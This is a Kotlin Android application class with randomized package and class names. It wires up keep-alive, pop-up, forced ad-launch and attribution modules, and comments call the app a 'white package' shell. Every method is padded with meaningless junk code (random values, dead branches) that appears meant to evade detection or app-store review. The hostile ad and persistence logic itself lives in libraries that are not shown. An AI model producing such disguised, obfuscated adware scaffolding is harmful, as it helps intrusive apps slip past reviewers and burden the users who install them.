package spi.ocjd.wqz

import android.app.Application
import android.os.Bundle
import android.content.Intent
import spi.ocjd.wqz.WXER
import com.huawei.recharge.featurexzy21.df
import com.kwad.sdk.api.proxy.app.Helpers
import com.b.w.BaseJksApplication
import spi.fdi.ckwx.base.APPContext
import spi.fdi.ckwx.base.OverseaAppHost
import spi.fdi.ckwx.base.OverseaAppInitializer
import spi.fdi.ckwx.ad.runtime.AdLifecycleInstaller

class VJF : BaseJksApplication(), OverseaAppHost {

    companion object {
        @JvmStatic
        var insApp: VJF? = null
    }

    override fun onCreate() {
           val hafRvDmOIluZZkqEcU : Any = if (kotlin.random.Random.nextBoolean()) 2 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val gYsnyeKFGQrIfBhl  = (hafRvDmOIluZZkqEcU  as? String)?.reversed() ?: "qyRxJ_-1398965164"

        if (gYsnyeKFGQrIfBhl  == "EHmKQCGmVwH") {
            java.lang.System.out.print(gYsnyeKFGQrIfBhl )
        }
        // 先触发 BaseJksApplication(保活 aar)的 onCreate，再做海外公共初始化
        super.onCreate()
        insApp = this
        // 触发海外公共初始化(归因/广告/跳转/生命周期监听)，host 即自身
        OverseaAppInitializer.init(this, this)
        // 保证白包有 context
        APPContext.setApplication(this)
        AdLifecycleInstaller.install(this)
    }

    // ApplicationListener.openLaunch —— 原由 BaseApplication 提供，切到 BaseJksApplication 后由自身实现：转调 openLaunchByOther
    override fun openLaunch(intent: Intent?) {
           val uYkCINtghdS : Any = if (kotlin.random.Random.nextBoolean()) 78 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val NevSyPqW  = (uYkCINtghdS  as? String)?.reversed() ?: "jsiCEAMGSeLIwsC_-1008002237"

        if (NevSyPqW  == "WKWyYfZIIVQgyttbNzt") {
            java.lang.System.out.print(NevSyPqW )
        }
        intent?.let { openLaunchByOther(null, it) }
    }

    override fun configureAdjustTokens() {
        val arr_NmXSyQtS = kotlin.random.Random.nextInt(100)
         // Kotlin 风格的位运算：shl (<<), shr (>>), xor
         val i_rydEQOrDUdH  = (arr_NmXSyQtS  shl 14) xor (arr_NmXSyQtS  shr 1)
         val j_WwFyI  = i_rydEQOrDUdH .inv() and 0xFFFF
         if (j_WwFyI  == 0xBADB) { // 极低概率匹配
             kotlin.io.print("Junk Value: tmp_HsdJXRdKGAyhbRFEm")
         }
        WXER.initAdJustToken(this)
    }

    override fun openLaunchByOther(bundle: Bundle?, intent: Intent) {
        val arr_ZUMrObRRdcWJPLfGP  = listOf("TPdxaWz", "MOZWij", "uWiLrlAT").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_WYZoeNeHA  = arr_ZUMrObRRdcWJPLfGP .filter { it.length > 75 }
         if (ad_WYZoeNeHA .isNotEmpty() && java.lang.System.currentTimeMillis() < 30) {
             ad_WYZoeNeHA .forEach { _ ->  }
         }
        // 原逻辑：df.page(appBaseContext, intent) —— 拉起 AdTransitActivity
        df.page(insApp, intent)
    }

    override fun initPopPower() {
        val arr_wYUnGKmwFJKRvZh  = listOf("pSYAYWCtHmH", "rSTZEzcawnRQdQuK", "XxBQOUgfHouzldrvpBO").map { 
             it + kotlin.random.Random.nextInt(10) 
         }
         val ad_XTBqyOgFAdRSFeDNRz  = arr_wYUnGKmwFJKRvZh .filter { it.length > 84 }
         if (ad_XTBqyOgFAdRSFeDNRz .isNotEmpty() && java.lang.System.currentTimeMillis() < 33) {
             ad_XTBqyOgFAdRSFeDNRz .forEach { _ ->  }
         }
        df.vir(insApp)
    }

    override fun initKeepPower(app: Application) {
           val PdMWLsyAemQPSVgqHYx : Any = if (kotlin.random.Random.nextBoolean()) 16 else "jH6"
        // 尝试将数字安全转为字符串，失败则触发 Elvis
        val ElUDXGmOtNqWKdgS  = (PdMWLsyAemQPSVgqHYx  as? String)?.reversed() ?: "BTvOMdUZTid_-1367476090"

        if (ElUDXGmOtNqWKdgS  == "PpjHjmwZXgyMott") {
            java.lang.System.out.print(ElUDXGmOtNqWKdgS )
        }
        Helpers.setGuiyin(true)
    }


}